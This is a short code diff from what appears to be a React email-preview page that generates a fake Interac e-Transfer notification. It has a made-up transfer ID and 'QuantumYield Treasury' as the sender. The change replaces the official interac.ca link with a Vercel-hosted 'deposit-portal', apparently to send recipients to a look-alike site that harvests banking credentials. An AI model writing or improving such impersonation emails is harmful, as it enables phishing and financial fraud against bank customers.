@@ -27,7 +27,7 @@ export default function EmailPreviewPage() {
     message: formData.message || undefined,
     securityQuestion: formData.securityQuestion,
     transferId: "INTC-733346-AWLX84P",
-    depositLink: "https://brandcentre.interac.ca/member-login/",
+    depositLink: "https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app/deposit-portal",
     senderName: "QuantumYield Treasury",
     institution: "QuantumYield Holdings | Treasury Reserve & Vaulted-Portal",
   })
